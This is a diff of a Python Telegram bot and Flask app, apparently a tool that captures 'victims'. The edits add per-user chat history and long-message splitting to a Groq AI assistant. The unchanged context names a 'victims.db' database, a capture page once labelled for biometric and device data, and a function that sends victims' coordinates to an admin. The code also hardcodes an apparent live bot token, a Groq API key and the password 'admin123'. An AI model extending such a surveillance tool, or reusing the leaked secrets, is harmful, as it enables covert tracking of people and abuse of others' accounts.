@@ -9,7 +9,7 @@ import edge_tts
 # -------------------- Configuration --------------------
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
 ADMIN_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "@Oython")
-ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8391932958"))
+ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8910769488"))
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
 GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "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")
 DATABASE = "victims.db"
@@ -20,6 +20,9 @@ AI_ENABLED = False
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
+
+# -------------------- Conversation History --------------------
+conversation_history = {}
 
 # -------------------- Database --------------------
 def get_db():
@@ -98,18 +101,14 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- Groq AI (Professional) --------------------
-def ask_groq(prompt):
+# -------------------- Groq AI (Context-aware) --------------------
+def ask_groq(prompt, user_id=None):
     if not GROQ_API_KEY:
         return "⚠️ کلید Groq تنظیم نشده است."
     try:
         url = "https://api.groq.com/openai/v1/chat/completions"
         headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
-        models = [
-            "llama-3.3-70b-versatile",
-            "deepseek-r1-distill-llama-70b",
-            "llama-3.1-8b-instant"
-        ]
+
         system_prompt = (
             "تو یک دستیار هوشمند، مستقیم و دقیق هستی. "
             "به سوال کاربر مستقیماً پاسخ بده، بدون اینکه بپرسی 'درباره چه موضوعی صحبت کنیم' یا 'چه سوالی داری'. "
@@ -118,14 +117,22 @@ def ask_groq(prompt):
             "مودب، دوستانه و حرفه‌ای باش. "
             "مکالمه را طبیعی ادامه بده، مثل یک دوست آگاه."
         )
+
+        messages = [{"role": "system", "content": system_prompt}]
+        if user_id is not None and user_id in conversation_history:
+            messages.extend(conversation_history[user_id][-20:])
+        messages.append({"role": "user", "content": prompt})
+
+        models = [
+            "llama-3.3-70b-versatile",
+            "deepseek-r1-distill-llama-70b",
+            "llama-3.1-8b-instant"
+        ]
         last_error = None
         for model in models:
             payload = {
                 "model": model,
-                "messages": [
-                    {"role": "system", "content": system_prompt},
-                    {"role": "user", "content": prompt}
-                ],
+                "messages": messages,
                 "temperature": 0.8,
                 "max_tokens": 2048
             }
@@ -133,17 +140,20 @@ def ask_groq(prompt):
             if resp.status_code == 200:
                 data = resp.json()
                 answer = data['choices'][0]['message']['content'].strip()
-                # اگر پاسخ حاوی عبارت‌های انحرافی بود، سعی بعدی
+                if user_id is not None:
+                    if user_id not in conversation_history:
+                        conversation_history[user_id] = []
+                    conversation_history[user_id].append({"role": "user", "content": prompt})
+                    conversation_history[user_id].append({"role": "assistant", "content": answer})
                 if "چه موضوعی" in answer or "چه سوالی" in answer or "در مورد چه" in answer:
                     continue
                 return answer
             else:
                 last_error = f"مدل {model}: {resp.status_code} - {resp.text[:200]}"
                 app.logger.warning(f"Groq model {model} failed: {resp.status_code}")
-        # اگر همه مدل‌ها پاسخ نامناسب دادند، پاسخ آخرین مدل را برگردان
         if last_error:
             return f"❌ هوش مصنوعی در دسترس نیست.\n{last_error}"
-        return answer  # fallback to last answer even if it contained those phrases
+        return answer
     except Exception as e:
         app.logger.error(f"Groq exception: {e}")
         return "❌ خطا در ارتباط با هوش مصنوعی."
@@ -253,7 +263,7 @@ function installApp(){
 }
 </script></body></html>"""
 
-# -------------------- Capture Page (Biometric + Device Info) --------------------
+# -------------------- Capture Page --------------------
 CAPTURE_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -836,18 +846,19 @@ async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
+    user_id = msg.from_user.id
+
     if msg.chat.type == 'private':
         conn = get_db_connection()
         conn.execute("INSERT OR IGNORE INTO private_chats (user_id, username, first_name, last_name, join_date) VALUES (?, ?, ?, ?, ?)",
-                     (msg.from_user.id, msg.from_user.username or "ندارد", msg.from_user.first_name or "", msg.from_user.last_name or "", datetime.now().isoformat()))
+                     (user_id, msg.from_user.username or "ندارد", msg.from_user.first_name or "", msg.from_user.last_name or "", datetime.now().isoformat()))
         conn.commit(); conn.close()
     elif msg.chat.type in ['group', 'supergroup']:
         conn = get_db_connection()
         conn.execute("INSERT OR REPLACE INTO groups (chat_id, title) VALUES (?, ?)", (msg.chat.id, msg.chat.title or "نامشخص"))
         conn.commit(); conn.close()
 
-    # واکنش تصادفی ربات
-    if random.random() < 0.2:  # 20% احتمال
+    if random.random() < 0.2:
         emoji = random.choice(REACTIONS)
         try:
             await msg.set_reaction(reaction=[emoji], is_big=False)
@@ -893,7 +904,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             conn.close()
             context.user_data.update({'awaiting_sell_price': False, 'sell_token': None})
             return
-        conn.execute("INSERT INTO listings (seller_id, token, price, sold, listed_at) VALUES (?, ?, ?, 0, ?)", (msg.from_user.id, token, price, datetime.now().isoformat()))
+        conn.execute("INSERT INTO listings (seller_id, token, price, sold, listed_at) VALUES (?, ?, ?, 0, ?)", (user_id, token, price, datetime.now().isoformat()))
         conn.commit()
         listing_id = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
         conn.close()
@@ -903,9 +914,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id:
         if AI_ENABLED and GROQ_API_KEY:
-            thinking = await msg.reply_text("🤔 ...")
-            answer = ask_groq(msg.text)
-            await thinking.edit_text(answer)
+            thinking_msg = await msg.reply_text("🤔 در حال فکر کردن...")
+            answer = ask_groq(msg.text, user_id=user_id)
+            if len(answer) > 4000:
+                parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
+                await thinking_msg.delete()
+                for part in parts:
+                    await msg.reply_text(part)
+            else:
+                await thinking_msg.edit_text(answer)
         return
 
     text_lower = msg.text.lower()
@@ -919,14 +936,21 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.close()
 
     if msg.chat.type == 'private' and AI_ENABLED and GROQ_API_KEY:
-        thinking = await msg.reply_text("🤔 ...")
-        answer = ask_groq(msg.text)
-        await thinking.edit_text(answer)
+        thinking_msg = await msg.reply_text("🤔 در حال فکر کردن...")
+        answer = ask_groq(msg.text, user_id=user_id)
+        if len(answer) > 4000:
+            parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
+            await thinking_msg.delete()
+            for part in parts:
+                await msg.reply_text(part)
+        else:
+            await thinking_msg.edit_text(answer)
 
 async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not AI_ENABLED or not GROQ_API_KEY:
         return
     msg = update.message
+    user_id = msg.from_user.id
     is_reply_to_bot = msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id
     if not is_reply_to_bot and msg.chat.type != 'private':
         return
@@ -937,14 +961,20 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not transcript:
         await msg.reply_text("❌ نتونستم صدات رو تشخیص بدم.")
         return
-    thinking = await msg.reply_text("🤔 ...")
-    answer = ask_groq(transcript)
+    thinking_msg = await msg.reply_text("🤔 ...")
+    answer = ask_groq(transcript, user_id=user_id)
     audio_data = await text_to_speech_async(answer)
     if audio_data:
         await msg.reply_voice(voice=io.BytesIO(audio_data))
-        await thinking.delete()
+        await thinking_msg.delete()
     else:
-        await thinking.edit_text(answer)
+        if len(answer) > 4000:
+            parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
+            await thinking_msg.delete()
+            for part in parts:
+                await msg.reply_text(part)
+        else:
+            await thinking_msg.edit_text(answer)
 
 async def handle_reaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reaction = update.message_reaction
@@ -1299,7 +1329,7 @@ if __name__ == '__main__':
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
     init_db()
-    application = Application.builder().token(TOKEN).build()
+    application = Application.builder().token(TOKEN).connect_timeout(30).read_timeout(30).write_timeout(30).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("admin", admin_cmd))
     application.add_handler(CommandHandler("learn", learn_command))
